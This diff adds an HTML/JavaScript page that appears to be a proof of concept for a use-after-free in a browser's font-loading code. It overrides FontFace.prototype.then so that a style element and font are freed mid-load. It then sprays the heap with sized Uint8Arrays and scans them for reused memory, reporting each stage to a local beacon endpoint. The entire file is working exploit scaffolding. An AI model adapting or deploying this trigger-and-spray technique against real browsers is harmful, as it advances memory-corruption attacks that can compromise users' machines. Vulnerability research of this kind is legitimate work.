@@ -1,0 +1,51 @@
+<!doctype html><meta charset="utf-8"><title>uaf21</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var styleEl=null, firedHere=false, BUF=[], hits=0, done=false;
+function scan(tag){
+  if (done) return; done=true;
+  var found=[];
+  for (var i=0;i<BUF.length;i++){
+    var u=BUF[i];
+    if (u[0]||u[0x58]||u[0x68]) found.push('b'+i+'-s'+u.length+'-0:'+hex8(u,0)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68));
+  }
+  if (found.length){ hits=found.length; b('U21-'+tag+'-HIT-'+found.slice(0,4).join('|')); }
+  else b('U21-'+tag+'-CLEAN-'+BUF.length);
+}
+function setup(){
+  var A=new FontFace('p0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: r0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U21-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      /* force any pending ref-drop BEFORE we spray */
+      try { document.fonts.check('1em r0'); } catch(e){}
+      BUF=[];
+      for (var j=0;j<96;j++) BUF.push(new Uint8Array(192));
+      var OTHER=[96,128,160,224];
+      for (var c=0;c<OTHER.length;c++) for (var k=0;k<8;k++) BUF.push(new Uint8Array(OTHER[c]));
+      b('U21-SPRAY-'+BUF.length);
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U21-LOAD-CALLED');
+  document.fonts.load('1em p0, r0','AB').then(function(){ b('U21-RESOLVED'); scan('R'); },
+                                            function(){ b('U21-REJECTED'); scan('R'); });
+  setTimeout(function(){ scan('T60'); },60);
+  setTimeout(function(){ scan('T400'); },400);
+}
+function run(){ b('U21-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
